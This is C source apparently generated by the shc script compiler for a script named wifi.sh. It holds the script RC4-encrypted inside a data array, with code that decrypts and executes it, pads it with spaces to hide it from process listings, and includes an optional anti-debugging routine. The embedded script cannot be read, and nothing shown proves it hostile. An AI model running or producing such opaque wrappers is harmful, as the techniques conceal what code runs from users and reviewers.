#if 0
	shc Version 3.8.9b, Generic Script Compiler
	Copyright (c) 1994-2015 Francisco Rosales <frosal@fi.upm.es>

	./shc -v -r -T -f wifi.sh 
#endif

static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[4]))
	"\104\336\121\104\211\253\214\313\103\142\074\264\320\376\110\173"
	"\001\271\112\347\020\015\067\133\114"
#define      rlax_z	1
#define      rlax	((&data[25]))
	"\073"
#define      xecc_z	15
#define      xecc	((&data[26]))
	"\123\246\063\272\203\362\213\324\155\261\374\271\331\277\144\204"
	"\312\216"
#define      lsto_z	1
#define      lsto	((&data[44]))
	"\331"
#define      date_z	1
#define      date	((&data[45]))
	"\210"
#define      tst1_z	22
#define      tst1	((&data[46]))
	"\242\136\274\060\244\057\316\201\221\334\371\253\040\260\326\207"
	"\304\000\313\152\011\052\366\206\117\263\240"
#define      chk1_z	22
#define      chk1	((&data[76]))
	"\265\135\253\310\012\033\030\203\125\116\043\245\116\035\262\131"
	"\130\133\147\377\115\240\251\266\264\046"
#define      msg2_z	19
#define      msg2	((&data[102]))
	"\241\066\073\072\213\153\322\156\160\224\351\302\134\116\341\354"
	"\303\041\333\046\106\015\266"
#define      text_z	710
#define      text	((&data[278]))
	"\227\132\356\304\117\212\044\115\216\333\163\251\243\357\226\353"
	"\233\305\323\271\102\152\162\224\306\204\021\171\074\062\360\302"
	"\232\233\017\300\166\351\212\344\360\021\055\134\017\235\245\013"
	"\001\040\023\074\070\132\155\306\116\032\334\124\004\322\355\130"
	"\171\231\115\272\127\354\330\211\327\026\254\227\223\076\217\345"
	"\365\111\342\242\060\276\161\203\154\262\354\155\362\003\042\251"
	"\236\162\157\010\067\121\146\270\030\103\042\214\133\072\245\316"
	"\032\045\361\347\227\305\112\325\326\314\171\211\324\175\203\172"
	"\217\271\122\332\260\304\250\222\204\074\075\201\111\145\372\322"
	"\265\341\330\041\135\236\371\272\154\134\266\357\117\346\362\146"
	"\127\320\215\340\057\157\177\002\142\047\052\211\101\363\235\376"
	"\224\065\023\375\151\135\263\036\002\366\253\211\210\304\014\070"
	"\074\045\076\320\127\270\335\036\242\075\124\220\315\304\264\014"
	"\051\376\207\062\100\354\144\351\014\051\112\354\127\002\266\132"
	"\160\251\276\261\224\204\226\172\116\240\373\335\055\217\235\140"
	"\126\156\235\101\341\363\166\275\313\324\327\131\326\330\273\141"
	"\062\131\136\274\113\101\022\022\264\275\377\221\220\137\000\314"
	"\345\013\334\203\002\030\072\347\265\374\224\051\145\304\252\070"
	"\372\041\075\151\006\224\243\263\300\152\350\237\376\115\102\241"
	"\333\247\012\325\061\017\076\323\022\035\031\255\134\156\156\120"
	"\114\162\231\021\034\176\065\157\255\032\015\026\113\244\165\335"
	"\146\347\322\304\230\325\340\274\134\106\031\264\074\220\154\104"
	"\245\246\071\230\022\177\075\377\127\344\121\175\022\365\243\254"
	"\255\141\112\112\336\274\372\146\073\026\122\325\045\006\333\057"
	"\206\100\343\174\232\364\066\351\347\350\261\004\062\043\036\346"
	"\135\107\351\071\364\173\174\347\066\175\064\042\366\235\334\263"
	"\065\232\133\144\215\336\121\003\055\047\126\027\045\341\334\273"
	"\310\227\241\226\364\347\045\237\074\216\036\262\132\122\316\122"
	"\126\257\162\106\151\042\342\232\264\257\364\133\030\012\217\217"
	"\367\301\356\015\130\223\363\277\376\016\207\014\023\004\030\131"
	"\034\122\046\247\165\202\227\001\065\070\067\373\065\072\115\031"
	"\332\325\004\366\155\171\003\165\144\363\015\076\165\307\336\224"
	"\026\006\047\246\030\266\346\207\006\033\361\142\373\257\101\235"
	"\373\264\357\116\137\233\100\216\340\232\033\044\172\352\263\025"
	"\213\323\134\302\142\243\247\315\007\026\370\115\014\277\264\166"
	"\317\075\340\217\312\214\305\220\154\147\031\113\075\062\021\352"
	"\040\004\231\257\305\106\105\162\103\043\174\344\037\133\205\157"
	"\250\165\103\304\235\166\044\153\023\133\002\062\136\240\362\137"
	"\031\111\351\271\310\302\236\233\104\215\237\076\016\306\074\001"
	"\027\255\314\116\344\071\011\342\113\143\151\312\100\324\362\066"
	"\155\300\101\155\153\110\032\277\153\317\272\244\306\061\167\217"
	"\106\026\354\141\274\201\133\333\023\232\242\253\245\327\040\255"
	"\224\075\337\007\164\145\165\317\044\322\355\154\055\256\303\347"
	"\311\326\064\177\275\330\013\171\246\053\314\045\113\176\211\140"
	"\351\222\304\170\124\016\363\234\020\143\161\103\064\245\065\032"
	"\127\157\376\326\272\305\346\044\042\232\061\070\006\225\253\004"
	"\113\136\361\010\265\374\074\172\056\115\166\344\365\114\050\177"
	"\310\251\056\317\371\064\152\364\374\376\143\205\025\162\043\147"
	"\107\073\244\020\073\350\270\116\236\247\345\260\235\053\347\010"
	"\330\063\210\034\312\055\316\257\122\020\043\016\014\233\337\273"
	"\137\205\151\360\310\167\360\363\321\333\140\151\373\156\175\253"
	"\336\266\143\210\024\324\023\065\175\035\147\101\275\055\056\310"
	"\275\046\336\043\222\237\234\241\003\273\166\305\252\335\370\020"
	"\254\272\374\374\161\205\034\346\313\307\046\212\102\307\142\310"
	"\277\125\242\126\303\011\142\005\325\253\023\153\267\360\227\373"
	"\335\025\305\012\051\301\067\175\044\141\276\265\033\246\162\250"
	"\261\046\054\032\115\162\162\064\063\040\064\304\252\114\353\007"
	"\174\352\364\213\235\344\015\063\170\103\043\366\245\332\143\256"
	"\220\014\265\260\066\047\321\160\272\377\010\072\310\211\320\165"
	"\035\127\235\324\031\052\112\360\202\170\100\353\050\112\026\025"
	"\075\013\074\252\154\360\057\367\340\157\105\150\164\254\367\166"
	"\074\337\003\357\273\126\247\325\113\016\303\356\332\170\235\065"
	"\106\074\240\077\332\300\123\354\337\326\113\300\146\110\152\357"
	"\020\004\215\062\135\045\270\263\055\274\031\130\244\156\250\151"
	"\323\306\131\046\130\202\264\150\001\075\070\241\035\107\234\143"
	"\002\257\324"
#define      inlo_z	3
#define      inlo	((&data[1165]))
	"\203\232\116"
#define      shll_z	10
#define      shll	((&data[1170]))
	"\357\364\160\025\243\041\154\055\324\276\230\315\327\012"
#define      pswd_z	256
#define      pswd	((&data[1228]))
	"\007\147\162\011\072\305\001\220\101\032\103\224\044\335\106\125"
	"\043\026\106\175\263\037\303\232\175\314\275\164\337\304\155\142"
	"\376\177\370\311\330\252\120\346\162\052\234\340\323\211\107\132"
	"\136\354\004\136\321\356\146\026\325\126\031\275\017\157\134\146"
	"\230\344\232\113\215\122\350\036\304\360\215\020\225\051\375\050"
	"\331\213\243\200\221\231\152\057\306\033\105\013\336\021\101\206"
	"\055\262\054\362\270\051\266\102\317\356\056\365\116\236\272\346"
	"\302\341\176\262\322\267\252\260\206\051\014\247\253\175\327\363"
	"\130\110\130\044\357\311\035\076\330\032\041\111\126\067\027\020"
	"\367\301\336\143\201\200\052\104\361\356\340\040\375\275\246\367"
	"\356\326\346\024\370\163\066\323\331\041\314\046\033\156\312\321"
	"\153\077\265\050\147\202\075\110\060\371\261\133\233\010\016\014"
	"\277\350\231\344\116\070\101\073\230\162\333\010\003\242\322\206"
	"\101\046\262\321\155\133\233\160\067\020\030\272\315\062\330\362"
	"\376\364\031\161\226\107\243\151\011\025\301\124\242\046\123\372"
	"\345\137\075\036\031\166\257\066\106\260\260\152\214\330\331\317"
	"\263\132\330\024\153\315\306\352\302\265\332\257\215\026\051\056"
	"\261\267\230\002\360\021\313\162\032\274\353\370\174\051\265\040"
	"\255\303\255\352\254\325\316\050\073\143\230\321\214\214\107\237"
	"\255\225\300\115\373\163\234\374\274\152\353\025\234\151\204\300"
	"\037\251\121\345\272\124\120\327\323\040\147\042"
#define      opts_z	1
#define      opts	((&data[1514]))
	"\202"
#define      chk2_z	19
#define      chk2	((&data[1519]))
	"\032\030\104\113\174\317\377\310\117\137\075\215\032\065\226\256"
	"\275\165\076\351\030\133\122"
#define      msg1_z	42
#define      msg1	((&data[1548]))
	"\001\161\363\165\213\343\231\026\272\035\112\343\171\157\161\057"
	"\024\174\106\067\327\042\041\311\203\364\062\375\164\272\363\312"
	"\230\130\347\057\023\246\164\337\304\145\236\346\123\043\232\040"
	"\254\025\043\337\246\363\067\015\335\122"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
